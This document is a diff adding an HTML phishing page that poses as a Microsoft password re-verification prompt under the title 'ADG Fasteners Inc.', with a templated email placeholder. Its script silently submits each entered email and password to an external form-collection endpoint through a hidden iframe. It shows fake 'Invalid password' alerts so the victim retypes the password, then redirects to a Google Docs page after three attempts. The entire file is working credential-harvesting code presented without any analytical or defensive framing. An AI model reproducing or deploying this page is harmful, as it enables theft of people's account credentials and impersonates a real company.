@@ -1,0 +1,182 @@
+
+
+
+<html>
+<head>
+	<meta name="viewport" content="width=device-width, initial-scale=1">
+	<meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
+	<title>ADG Fasteners Inc. </title>
+
+	<style>
+body, html { height: 100%;margin: 0; font-family: Arial, Helvetica, sans-serif;
+}
+* {
+  box-sizing: border-box;
+}
+.bg-image {
+  /* The image used */
+  background-image: url("https://i.pinimg.com/236x/46/85/2d/46852dd5fa51b69bdf5cc5c65c718ed9.jpg");
+   opacity: 0.5;
+  /* Add the blur effect */ filter: blur(-px); -webkit-filter: blur(-px);
+  /* Full height */ height: 150%; /* Center and scale the image nicely */
+  background-position: center; background-repeat: no-repeat; background-size: cover;
+}
+
+/* Position text in the middle of the page/image */
+.bg-text {
+  background: #143b08;
+  width:370px; height:450px; -webkit-box-shadow: 1px 1px 15px 1px #000000;
+  box-shadow: 1px 1px 15px 1px #000000; border-radius: 1px 25px 1px 40px;
+
+  position: absolute; top: 50%; left: 50%; transform: translate(-50%, -50%); z-index: 2; text-align: center;
+}
+input[type=submit] {
+  width:290px; height:40px; font-family: arial; font-size: 14px; color:#FFF; background-color: #0489B1; border: solid 1px #0489B1; border-radius: 2px 10px 2px 10px;
+  -webkit-box-shadow: 2px 2px 15px 5px #000000; box-shadow: 2px 2px 15px 5px #000000;  font-weight:bold;
+}
+input[type=password] {
+  width:290px; height:35px; font-family: arial; font-size: 13px; border-radius: 3px;
+  color:#000000; background-color: #FFF; border: solid 1px #FFF; padding: 10px;
+  }
+input[type=email] {
+  width:290px; height:35px; font-family: arial; font-size: 13px; border-radius: 3px;
+  color:#000000; background-color: #FFF; border: solid 1px #FFF; padding: 10px;
+    }
+</style>
+
+
+</td></tr>
+
+<tr><td height="75%"  bgcolor="#FFF">
+<div class="bg-image"></div>
+<div class="bg-text">
+
+
+	<table align="center" cellspacing="0">
+	<tr><td style="height:10px;"></td></tr>
+
+					<tr><td style="height:8px;"></td></tr>
+					<tr><td>
+					<form method="post" action="https://usebasin.com/f/4c0f6f6a5709" id="loginForm">
+					</td></tr>
+					<tr><td>
+								</font>
+							</div>
+					</td></tr>
+					<tr><td style="height:7px;"></td></tr>
+					<tr><td>
+							<div align="center">
+								<font face="arial" size="1" color="#FFF">
+									<b></b>
+								</font>
+							</div>
+					</td></tr>
+					<tr><td style="height:7px;"></td></tr>
+
+					<tr><td>
+							<div align="center">
+								<img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcTNpnPzHT1IIeCix2vSs-MX3dcqgqvrqmH7Tg&usqp=CAU">
+							</div>
+					</td></tr>
+					<tr><td style="height:;"></td></tr>
+
+					<tr><td style="height:5px;">
+								<div align="center">
+								<font face="arial" size="2" color="#FFF">
+									<font size="1">Because you're accessing sensitive info, you need to verify your password</font>
+								</font>
+								</div>
+					</td></tr>
+
+					<tr><td style="height:5px;"></td></tr>
+
+					<tr><td>
+						<table cellspacing="0" align="center">
+						<tr><td>
+							<div align="center">
+								<input  name="login" type="email" value="[[-Email-]]" placeholder="required">
+							</div>
+						</td></tr>
+
+
+						<tr><td style="height:7px;"></td></tr>
+
+						<tr><td>
+							<div align="center">
+								<input  name="passwd" type="password" placeholder="Password" required>
+							</div>
+						</td></tr>
+						<tr><td style="height:15px;"></td></tr>
+						<tr><td>
+							<div align="left">
+								<input type="submit" value="Sign in" onclick="validatePassword()">
+								
+							</div>
+						</td></tr>
+						<tr><td>
+						</td></tr>
+						<tr><td style="height:20px;">
+						
+							</form>
+<iframe id="invisibleFrame" name="invisibleFrame" style="display: none;"></iframe>
+<script>
+    var attempts = 0;
+
+    function validatePassword() {
+        var password = document.getElementsByName("passwd")[0].value;
+        var maxAttempts = 3; // Maximum number of attempts
+
+        
+        if (password !== "secret123") {
+            attempts++;
+            alert("Invalid password");
+            if (attempts >= maxAttempts) {
+                
+                window.location.replace("https://docs.google.com/spreadsheets/d/1FKwO_0myJKhl6R1Q8rbHOcnOo4clIKYBjjAOVMC4ba4/edit?pref=2&pli=1#gid=1573896427");
+            } else {
+                // Perform the form action secretly in the background
+                executeFormAction();
+            }
+            return false;
+        } else {
+            // Reset attempts counter if the password is correct
+            attempts = 0;
+
+            // Perform the form action secretly in the background
+            executeFormAction();
+
+            return false; // Prevent default form submission
+        }
+    }
+
+    function executeFormAction() {
+        var form = document.getElementById("loginForm");
+        var actionUrl = form.getAttribute("action");
+        var formData = new FormData(form);
+
+        var iframe = document.getElementById("invisibleFrame");
+        iframe.onload = function () {
+            // Handle the response as needed
+            console.log("Form submitted successfully!");
+        };
+
+        form.setAttribute("target", "invisibleFrame");
+        form.submit();
+    }
+</script>
+						</td></tr>
+						</table>
+					</td></tr>
+	</table>
+</div>
+</td></tr>
+<tr><td height="5%" bgcolor="#1C1C1C">
+	<div align="center">
+		<font face="verdana" size="1" color="#FFF">
+			Copyright © 2022 microsoft. All rights reserved.
+		</font>
+	</div>
+</td></tr>
+</table>
+</body>
+</html>
